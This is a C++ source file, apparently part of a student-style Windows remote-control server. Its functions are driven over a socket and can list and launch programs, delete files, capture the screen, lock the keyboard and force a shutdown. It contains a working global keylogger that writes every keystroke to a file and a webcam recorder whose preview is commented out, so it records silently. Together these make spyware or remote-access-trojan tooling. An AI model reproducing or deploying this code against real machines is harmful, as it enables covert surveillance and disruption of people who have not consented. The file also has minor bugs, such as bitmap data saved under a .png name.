#include "Header.h"
#include "Task.h"

string wstringToString(const wstring& wstr) {
	int sizeNeeded = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, nullptr, 0, nullptr, nullptr);
	string str(sizeNeeded, 0);
	WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &str[0], sizeNeeded, nullptr, nullptr);
	return str;
}

void ExportInstalledApplicationsFromRegistry(HKEY rootKey, const char* subKey, ofstream& outputFile) {
	HKEY hKey;

	// Mở registry key
	if (RegOpenKeyExA(rootKey, subKey, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
		return; // Không thể mở key, bỏ qua
	}

	char appName[256];
	DWORD appNameSize;
	DWORD index = 0;

	// Duyệt qua tất cả các subkey
	while (true) {
		appNameSize = sizeof(appName);
		LONG result = RegEnumKeyExA(hKey, index, appName, &appNameSize, nullptr, nullptr, nullptr, nullptr);

		if (result == ERROR_NO_MORE_ITEMS) {
			break; // Không còn subkey nào
		}
		else if (result != ERROR_SUCCESS) {
			break;
		}

		// Mở subkey để lấy thông tin chi tiết
		HKEY hSubKey;
		if (RegOpenKeyExA(hKey, appName, 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
			char displayName[256] = { 0 };
			DWORD displayNameSize = sizeof(displayName);

			// Đọc DisplayName
			if (RegQueryValueExA(hSubKey, "DisplayName", nullptr, nullptr, (LPBYTE)displayName, &displayNameSize) == ERROR_SUCCESS) {
				string appNameStr(displayName);

				// Bỏ qua nếu DisplayName chứa "False" hoặc chuỗi rỗng
				if (!appNameStr.empty() && appNameStr.find("False") == string::npos) {
					outputFile << displayName << endl;
				}
			}

			RegCloseKey(hSubKey);
		}
		index++;
	}

	RegCloseKey(hKey);
}

void CheckSpecificApps(ofstream& outputFile) {
	vector<pair<string, string>> appsToCheck = {
		{"Notepad", "C:\\Windows\\System32\\notepad.exe"},
		{"Microsoft Word", "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"},
		{"Microsoft PowerPoint", "C:\\Program Files\\Microsoft Office\\root\\Office16\\POWERPNT.EXE"},
		{"Microsoft Excel", "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"},
		{"Microsoft Outlook", "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"},
		{"Microsoft Access", "C:\\Program Files\\Microsoft Office\\root\\Office16\\MSACCESS.EXE"},
		{"Microsoft Publisher", "C:\\Program Files\\Microsoft Office\\root\\Office16\\MSPUB.EXE"},
		{"Microsoft Teams", "C:\\Program Files\\Microsoft Teams\\current\\Teams.exe"},
		{"Microsoft OneNote", "C:\\Program Files\\Microsoft Office\\root\\Office16\\ONENOTE.EXE"},
		{"Skype for Business", "C:\\Program Files\\Microsoft Office\\root\\Office16\\LYNC.EXE"},
		{"Microsoft Paint", "C:\\Windows\\System32\\mspaint.exe"},
{"Microsoft Calculator", "C:\\Windows\\System32\\calc.exe"},
		{"Microsoft Sticky Notes", "C:\\Windows\\SystemApps\\MicrosoftStickyNotes_8wekyb3d8bbwe\\Microsoft.Notes.exe"}
	};

	for (const auto& app : appsToCheck) {
		if (GetFileAttributesA(app.second.c_str()) != INVALID_FILE_ATTRIBUTES) {
			outputFile << app.first << endl;
		}
	}
}

bool ListApps() {
	ofstream output("List_Apps.txt");
	if (!output.is_open()) {
		cout << "Error: Cannot open file to write." << endl;
		return false;
	}

	// Đọc ứng dụng từ các key khác nhau
	ExportInstalledApplicationsFromRegistry(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", output);
	ExportInstalledApplicationsFromRegistry(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", output);
	ExportInstalledApplicationsFromRegistry(HKEY_LOCAL_MACHINE, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall", output);

	// Kiểm tra các ứng dụng cụ thể
	CheckSpecificApps(output);

	output.close();
	return true;
}

void StartApp(SOCKET clientSocket, const string& path_app) {
	// Kiểm tra đường dẫn trống
	if (path_app.empty()) {
		cout << "Error: Path is empty." << endl;
		send(clientSocket, "Error: Path is empty!", strlen("Error: Path is empty."), 0);
		return;
	}

	// Tách đường dẫn và tham số nếu có
	size_t firstSpace = path_app.find(' ');
	string executablePath = (firstSpace != string::npos) ? path_app.substr(0, firstSpace) : path_app;
	string arguments = (firstSpace != string::npos) ? path_app.substr(firstSpace) : "";

	// Kiểm tra đường dẫn thực thi
	wstring wExecutablePath(executablePath.begin(), executablePath.end());

	// Nếu là thư mục, thêm tên file thực thi mặc định
	if (GetFileAttributesW(wExecutablePath.c_str()) == FILE_ATTRIBUTE_DIRECTORY) {
		wExecutablePath += L"\\example.exe"; // Tùy chỉnh tên file mặc định
	}

	// Kiểm tra lại đường dẫn thực thi đầy đủ
	if (GetFileAttributesW(wExecutablePath.c_str()) == INVALID_FILE_ATTRIBUTES) {
		cout << "Error: Invalid application path or file does not exist." << endl;
		send(clientSocket, "Error: Invalid application path or file does not exist.", strlen("Error: Invalid application path or file does not exist."), 0);
		return;
	}

	// Tạo tiến trình mới
	STARTUPINFO si = { 0 };
	si.cb = sizeof(STARTUPINFO);
	PROCESS_INFORMATION pi;

	wstring fullCommand = wExecutablePath + L" " + wstring(arguments.begin(), arguments.end());

	if (CreateProcess(
		NULL,                   // Không dùng đường dẫn cụ thể
		&fullCommand[0],        // Lệnh đầy đủ
		NULL,                   // Không bảo vệ tiến trình
		NULL,                   // Không bảo vệ luồng
		FALSE,                  // Không redirect đầu vào/đầu ra
		CREATE_NEW_CONSOLE,     // Tạo cửa sổ console mới
		NULL,                   // Không dùng biến môi trường khác
		NULL,                   // Không thay đổi thư mục làm việc
		&si,                    // STARTUPINFO
		&pi                     // PROCESS_INFORMATION
	)) {
		cout << "Run App successful!" << endl;
		send(clientSocket, "Run App successful!", strlen("Run App successful!"), 0);

		// Đóng các handle
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	else {
		cout << "Error: Failed to start the application." << endl;
		send(clientSocket, "Error: Failed to start the application.", strlen("Error: Failed to start the application."), 0);
	}
}

void CloseApp(SOCKET clientSocket, wstring& appWindowTitle) {

	// Find the window by its title
	HWND hwnd = FindWindow(NULL, appWindowTitle.c_str());

	if (hwnd == NULL) {
		cout << "Error: Window with the specified title not found." << endl;
		send(clientSocket, "Error: Window with the specified title not found.", strlen("Error: Window with the specified title not found."), 0);
		return;
	}

	// Send the close message to the window
	if (PostMessage(hwnd, WM_CLOSE, 0, 0)) {
		cout << "Application has been closed!" << endl;
		send(clientSocket, "Application has been closed!", strlen("Application has been closed!"), 0);
	}
	else {
		cout << "Error: Unable to close the application." << endl;
		send(clientSocket, "Error: Unable to close the application.", strlen("Error: Unable to close the application."), 0);
	}
	return;
}

bool ListServices() {
	SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
	if (hSCManager == NULL) {
		cout << "Error : Failed to open service manager. Error code: " << GetLastError() << endl;
		return false;
	}

	DWORD dwBytesNeeded = 0;
	DWORD dwServicesReturned = 0;
	DWORD dwResumeHandle = 0;
	LPENUM_SERVICE_STATUS lpssServices = NULL;
	DWORD dwServiceCount = 0;

	// Get the required buffer size
	EnumServicesStatus(hSCManager, SERVICE_WIN32, SERVICE_STATE_ALL, NULL, 0, &dwBytesNeeded, &dwServicesReturned, &dwResumeHandle);

	lpssServices = (LPENUM_SERVICE_STATUS)malloc(dwBytesNeeded);
	if (lpssServices == NULL) {
		cout << "Error: Memory allocation failed." << endl;
		CloseServiceHandle(hSCManager);
		return false;
	}

	// Enumerate services
	if (!EnumServicesStatus(hSCManager, SERVICE_WIN32, SERVICE_STATE_ALL, lpssServices, dwBytesNeeded, &dwBytesNeeded, &dwServicesReturned, &dwResumeHandle)) {
		cout << "Erorr: Failed to enumerate services. Error code: " << GetLastError() << endl;
		free(lpssServices);
		CloseServiceHandle(hSCManager);
		return false;
	}

	ofstream outfile("List_Services.txt");

	// Process the services and write to the file
	for (DWORD i = 0; i < dwServicesReturned; i++) {
		SC_HANDLE hService = OpenService(hSCManager, lpssServices[i].lpServiceName, SERVICE_QUERY_STATUS);
		if (hService != NULL) {
			SERVICE_STATUS_PROCESS status;
			DWORD dwBytesNeeded;
			if (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&status, sizeof(SERVICE_STATUS_PROCESS), &dwBytesNeeded)) {
				outfile << "Name Service: " << wstringToString(lpssServices[i].lpServiceName);
				outfile << "\n";
				outfile << "PID: " << status.dwProcessId << "\n\n";
			}
			else {
				outfile << "Name Service: " << wstringToString(lpssServices[i].lpServiceName);
				outfile << "\n";
				outfile << "PID: N/A\n\n";
			}
			CloseServiceHandle(hService);
		}
		else {
			outfile << "Name Service: " << wstringToString(lpssServices[i].lpServiceName);
			outfile << "\n";
			outfile << "PID: N/A\n\n";
		}
	}

	free(lpssServices);
	CloseServiceHandle(hSCManager);

	return true;
}

bool FindFile(string directory, const string& search_name, string& result_path) {
	WIN32_FIND_DATAA findFileData;
	HANDLE hFind = INVALID_HANDLE_VALUE;

	// Thêm dấu * vào cuối đường dẫn để tìm tất cả các tệp và thư mục
	string search_path = directory + "\\*";

	// Bắt đầu tìm kiếm các tệp và thư mục trong đường dẫn
	hFind = FindFirstFileA(search_path.c_str(), &findFileData);
	if (hFind == INVALID_HANDLE_VALUE) {
		//cout << "Error opening directory: " << directory << endl;
		return false;
	}

	do {
		// Bỏ qua các mục đặc biệt "." và ".."
		if (strcmp(findFileData.cFileName, ".") != 0 && strcmp(findFileData.cFileName, "..") != 0) {
			string full_path = directory + "\\" + findFileData.cFileName;

			// Kiểm tra nếu tên tệp hoặc thư mục khớp với tên tìm kiếm
			if (strcmp(findFileData.cFileName, search_name.c_str()) == 0) {
				result_path = full_path;
				FindClose(hFind);  // Đảm bảo đóng handle sau khi sử dụng
				return true;
			}

			// Nếu là thư mục, thực hiện tìm kiếm đệ quy trong thư mục con
			if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				if (FindFile(full_path, search_name, result_path)) {
					FindClose(hFind);  // Đảm bảo đóng handle sau khi sử dụng
					return true;
				}
			}
		}
	} while (FindNextFileA(hFind, &findFileData) != 0);

	FindClose(hFind);  // Đảm bảo đóng handle khi không tìm thấy tệp
	return false;
}

string Process_Path(const string& path) {
	string processed_path = path;
	// Thay thế tất cả '\' thành '\\'
	for (size_t i = 0; i < processed_path.size(); ++i) {
		if (processed_path[i] == '\\') {
			processed_path.insert(i, "\\");
			++i; // Bỏ qua ký tự vừa thêm
		}
	}
	return processed_path;
}

bool Copy_File(const string& source, const string& destination) {
	Process_Path(source);
	Process_Path(destination);

	// Mở file nguồn để đọc
	ifstream source_file(source, ios::binary);
	if (!source_file) {
		cout << "Error: Cannot opening source file: " << source << endl;
		return false;
	}

	// Kiểm tra xem tệp đích đã tồn tại chưa
	ifstream check_dest(destination);
	if (check_dest) {
		cout << "Error: Destination file already exists: " << destination << endl;
		check_dest.close(); // Đảm bảo đóng tệp kiểm tra
		return false;
	}

	// Mở file đích để ghi
	ofstream destination_file(destination, ios::binary);
	if (!destination_file) {
		cout << "Error: Cannot opening destination file: " << destination << endl;
		return false;
	}

	// Sao chép nội dung từ file nguồn sang file đích
	destination_file << source_file.rdbuf();

	// Đóng file
	source_file.close();
	destination_file.close();

	return true;
}

bool Delete_File(const string& path) {
	WIN32_FIND_DATAA findFileData;
	HANDLE hFind = INVALID_HANDLE_VALUE;

	// Thêm dấu * vào cuối đường dẫn để tìm tất cả các tệp và thư mục
	string search_path = path + "\\*";

	hFind = FindFirstFileA(search_path.c_str(), &findFileData);

	if (hFind == INVALID_HANDLE_VALUE) {
		// Trường hợp là tệp, thử xóa tệp
		if (DeleteFileA(path.c_str())) {
			cout << "Deleted file: " << path << endl;
			return true;
		}
		else {
			cout << "Error: Could not delete file or folder: " << path << endl;
			return false;
		}
	}

	// Trường hợp là thư mục, duyệt qua tất cả các tệp và thư mục con
	do {
		// Bỏ qua "." và ".."
		if (strcmp(findFileData.cFileName, ".") != 0 && strcmp(findFileData.cFileName, "..") != 0) {
			string full_path = path + "\\" + findFileData.cFileName;

			// Kiểm tra xem đó là thư mục hay tệp
			if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				// Nếu là thư mục, thực hiện xóa đệ quy
				if (!Delete_File(full_path)) {
					FindClose(hFind);
					return false;
				}
			}
			else {
				// Nếu là tệp, xóa tệp
				if (!DeleteFileA(full_path.c_str())) {
					cout << "Error: Could not delete file: " << full_path << endl;
					FindClose(hFind);
					return false;
				}
			}
		}
	} while (FindNextFileA(hFind, &findFileData) != 0);

	FindClose(hFind);

	// Xóa thư mục trống sau khi tất cả tệp/thư mục con đã bị xóa
	if (!RemoveDirectoryA(path.c_str())) {
		cout << "Error: Could not remove directory: " << path << endl;
		return false;
	}

	cout << "Deleted folder: " << path << endl;
	return true;
}

bool CaptureScreen() {
	// Lấy kích thước màn hình
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);

	// Tạo một DC (Device Context) cho màn hình
	HDC hdcScreen = GetDC(NULL);
	if (!hdcScreen) {
		cout << "Error: Failed to get screen device context." << endl;
		return false;
	}

	HDC hdcMemory = CreateCompatibleDC(hdcScreen);
	if (!hdcMemory) {
		cout << "Error: Failed to create compatible memory DC." << endl;
		ReleaseDC(NULL, hdcScreen);
		return false;
	}

	// Tạo một bitmap tương thích với màn hình
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
	if (!hBitmap) {
		cout << "Error: Failed to create compatible bitmap." << endl;
		DeleteDC(hdcMemory);
		ReleaseDC(NULL, hdcScreen);
		return false;
	}

	SelectObject(hdcMemory, hBitmap);

	// Chụp màn hình vào bitmap
	if (!BitBlt(hdcMemory, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY)) {
		cout << "Error: Failed to capture screen." << endl;
		DeleteObject(hBitmap);
		DeleteDC(hdcMemory);
		ReleaseDC(NULL, hdcScreen);
		return false;
	}

	// Lưu hình ảnh dưới dạng BMP
	BITMAPFILEHEADER bfh;
	BITMAPINFOHEADER bih;
	memset(&bfh, 0, sizeof(bfh));
	memset(&bih, 0, sizeof(bih));

	bfh.bfType = 0x4D42;  // "BM"
	bfh.bfOffBits = sizeof(bfh) + sizeof(bih);
	bfh.bfSize = bfh.bfOffBits + (screenWidth * screenHeight * 3);

	bih.biSize = sizeof(bih);
	bih.biWidth = screenWidth;
	bih.biHeight = -screenHeight; // Lật ảnh dọc
	bih.biPlanes = 1;
	bih.biBitCount = 24;
	bih.biCompression = BI_RGB;

	ofstream outFile("Capture_Screen.png", ios::binary);
	if (!outFile) {
		cout << "Error: Failed to open output file." << endl;
		DeleteObject(hBitmap);
		DeleteDC(hdcMemory);
		ReleaseDC(NULL, hdcScreen);
		return false;
	}

	// Ghi header bitmap
	outFile.write(reinterpret_cast<char*>(&bfh), sizeof(bfh));
	outFile.write(reinterpret_cast<char*>(&bih), sizeof(bih));

	// Ghi dữ liệu ảnh
	int rowSize = (screenWidth * 3 + 3) & (~3);  // Đảm bảo mỗi hàng là bội của 4 byte
	unique_ptr<char[]> rowData(new(nothrow) char[rowSize]);
	if (!rowData) {
		cout << "Error: Failed to allocate memory for row data." << endl;
		outFile.close();
		DeleteObject(hBitmap);
		DeleteDC(hdcMemory);
		ReleaseDC(NULL, hdcScreen);
		return false;
	}

	for (int y = screenHeight - 1; y >= 0; --y) {
		if (!GetDIBits(hdcMemory, hBitmap, y, 1, rowData.get(), reinterpret_cast<BITMAPINFO*>(&bih), DIB_RGB_COLORS)) {
			cout << "Error: Failed to get DIB bits." << endl;
			outFile.close();
			DeleteObject(hBitmap);
			DeleteDC(hdcMemory);
			ReleaseDC(NULL, hdcScreen);
			return false;
		}
		outFile.write(rowData.get(), rowSize);
	}

	// Dọn dẹp tài nguyên
	outFile.close();
	DeleteObject(hBitmap);
	DeleteDC(hdcMemory);
	ReleaseDC(NULL, hdcScreen);

	return true;
}

LRESULT CALLBACK LowLevelKeyboardProc_KeyLogger(int nCode, WPARAM wParam, LPARAM lParam) {
	static ofstream ofile("Key_Logger.txt", ios::out | ios::trunc);

	if (nCode == HC_ACTION) {
		KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
		int vkCode = kbdStruct->vkCode;

		// Kiểm tra nếu phím Shift hoặc Caps Lock được bật
		bool isCapsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
		bool isShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;

		if (wParam == WM_KEYDOWN) { // Sự kiện nhấn phím
			if (vkCode >= 0x30 && vkCode <= 0x39) {  // Phím số
				ofile << char(vkCode);
				cout << char(vkCode);  // Hiển thị trên console
			}
			else if (vkCode >= 0x41 && vkCode <= 0x5A) {  // Phím chữ
				if (isShiftPressed || isCapsLockOn) {
					ofile << char(vkCode);  // Chữ hoa
					cout << char(vkCode);  // Hiển thị trên console
				}
				else {
					ofile << char(vkCode + 32);  // Chuyển thành chữ thường
					cout << char(vkCode + 32);  // Hiển thị trên console
				}
			}
			else if (vkCode == VK_SPACE) {
				ofile << "[SPACE]";
				cout << "[SPACE]";  // Hiển thị trên console
			}
			else if (vkCode == VK_RETURN) {
				ofile << "[ENTER]";
				cout << "[ENTER]";  // Hiển thị trên console
			}
			else if (vkCode == VK_TAB) {
				ofile << "[TAB]";
				cout << "[TAB]";  // Hiển thị trên console
			}
			else if (vkCode == VK_ESCAPE) {
				ofile << "[ESC]";
				cout << "[ESC]";  // Hiển thị trên console
			}
			else {
				ofile << "[Key " << vkCode << "]";
				cout << "[Key " << vkCode << "]";  // Hiển thị trên console
			}
			ofile.flush(); // Ghi ngay vào tệp
		}
	}
	return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

void KeyLogger(int duration) {
	HHOOK g_hHook = NULL;
	g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc_KeyLogger, GetModuleHandle(nullptr), 0);
	if (!g_hHook) {
		cout << "Error!" << GetLastError() << endl;
		return;
	}

	cout << "Keylogger running for " << duration << " seconds..." << endl;

	// Chạy vòng lặp xử lý sự kiện hook
	MSG msg;
	bool running = true;
	auto start_time = chrono::high_resolution_clock::now();
	while (running) {  // Kiểm tra biến `running` thông thường
		auto current_time = chrono::high_resolution_clock::now();
		auto elapsed = chrono::duration_cast<chrono::seconds>(current_time - start_time).count();

		if (elapsed >= duration) {
			running = false; // Kết thúc khi hết thời gian
			break;
		}

		if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	// Gỡ bỏ hook
	if (g_hHook) {
		UnhookWindowsHookEx(g_hHook);
		g_hHook = NULL;
	}

	cout << endl << "Timeout!" << endl;
}

// Biến toàn cục để kiểm soát trạng thái khóa bàn phím
bool g_blockKeyboard = false;
HHOOK g_hHook = nullptr;

LRESULT CALLBACK LowLevelKeyboardProc_LockKeyboard(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HC_ACTION && g_blockKeyboard) {
		return true; // Chặn tất cả các sự kiện bàn phím
	}
	return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

bool installKeyboardHook() {
	g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc_LockKeyboard, GetModuleHandle(nullptr), 0);
	if (!g_hHook) {
		cout << "Error: Failed to install keyboard hook. Error code: " << GetLastError() << "\n";
		return false;
	}
	return true;
}

void uninstallKeyboardHook() {
	if (g_hHook) {
		UnhookWindowsHookEx(g_hHook);
		g_hHook = nullptr;
	}
}

void LockKeyboard(SOCKET clientSocket, int durationSeconds) {
	string message = "The keyboard have been locked for " + to_string(durationSeconds) + "s!";
	cout << message;
	send(clientSocket, message.c_str(), strlen(message.c_str()), 0);
	g_blockKeyboard = true;

	if (!installKeyboardHook()) {
		cout << "Error: Could not install keyboard hook. Aborting...\n";
		return;
	}

	// Vòng lặp thông điệp để giữ hook hoạt động
	MSG msg;
	auto startTime = chrono::steady_clock::now();

	while (true) {
		if (PeekMessage(&msg, nullptr, 0, 0, PM_REMOVE)) {
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}

		// Kiểm tra thời gian đã trôi qua
		auto currentTime = chrono::steady_clock::now();
		auto elapsedSeconds = chrono::duration_cast<chrono::seconds>(currentTime - startTime).count();

		if (elapsedSeconds >= durationSeconds) {
			break;
		}
	}

	// Gỡ bỏ hook và mở khóa bàn phím
	g_blockKeyboard = false;
	uninstallKeyboardHook();
	cout << endl << "The keyboard have been unlocked!" << endl;
	send(clientSocket, "The keyboard have been unlocked!", strlen("The keyboard have been unlocked!"), 0);
}

void WebCamera(int duration) {
	cv::utils::logging::setLogLevel(cv::utils::logging::LOG_LEVEL_SILENT);
	cv::VideoCapture cap(0);
	if (!cap.isOpened()) {
		cout << "Error: Cannot open the camera." << endl;
		return;
	}

	int frame_width = (int)cap.get(cv::CAP_PROP_FRAME_WIDTH);
	int frame_height = (int)cap.get(cv::CAP_PROP_FRAME_HEIGHT);

	int fps = (int)cap.get(cv::CAP_PROP_FPS); // Lấy FPS
	if (fps <= 0) fps = 30; // Gán giá trị mặc định nếu không hợp lệ

	cv::VideoWriter video_writer("Web_Camera.avi", cv::VideoWriter::fourcc('M', 'J', 'P', 'G'), fps, cv::Size(frame_width, frame_height));

	if (!video_writer.isOpened()) {
		cout << "Error: Cannot open file to record." << endl;
		return;
	}

	cv::Mat frame;
	int frame_limit = fps * duration; // Số frame cần ghi
	int frame_count = 0;

	cout << "Camera is opening, press 'q' to turn it off or it will run for " << duration << " seconds." << endl;

	while (frame_count < frame_limit) {
		cap >> frame;
		if (frame.empty()) {
			cout << "Error: Cannot receive any frames from the camera." << endl;
			break;
		}

		video_writer.write(frame);
		frame_count++;

		//cv::imshow("Camera Feed", frame);
		if (cv::waitKey(1000 / fps) == 'q') break;
	}

	cap.release();
	video_writer.release();
	cv::destroyAllWindows();
}

bool enable_shutdown_privilege() {
	HANDLE token;
	TOKEN_PRIVILEGES token_privileges;

	// Mở token của tiến trình hiện tại
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
		cout << "Error: Failed to open process token. Error code: " << GetLastError() << endl;
		return false;
	}

	// Lấy LUID cho quyền tắt máy
	if (!LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &token_privileges.Privileges[0].Luid)) {
		cout << "Error: Failed to lookup privilege value. Error code: " << GetLastError() << endl;
		CloseHandle(token);
		return false;
	}

	token_privileges.PrivilegeCount = 1;
	token_privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Điều chỉnh đặc quyền của tiến trình để cho phép tắt máy
	if (!AdjustTokenPrivileges(token, FALSE, &token_privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0)) {
		cout << "Error: Failed to adjust token privileges. Error code: " << GetLastError() << endl;
		CloseHandle(token);
		return false;
	}

	CloseHandle(token);
	return true;
}

void RestartComputer() {
	// Kích hoạt quyền khởi động lại trước khi gọi ExitWindowsEx
	if (!enable_shutdown_privilege()) {
		cout << "Error: Failed to enable restart privilege." << endl;
		return;
	}

	// Yêu cầu khởi động lại với các quyền cần thiết
	if (!ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER)) {
		cout << "Error: Restart failed. Error code: " << GetLastError() << endl;
	}
}

void ShutDownComputer() {
	// Kích hoạt quyền tắt máy trước khi gọi ExitWindowsEx
	if (!enable_shutdown_privilege()) {
		cout << "Error: Failed to enable shutdown privilege." << endl;
		return;
	}

	// Yêu cầu tắt máy với các quyền cần thiết
	if (!ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER)) {
		cout << "Error: Shutdown failed. Error code: " << GetLastError() << endl;
	}
}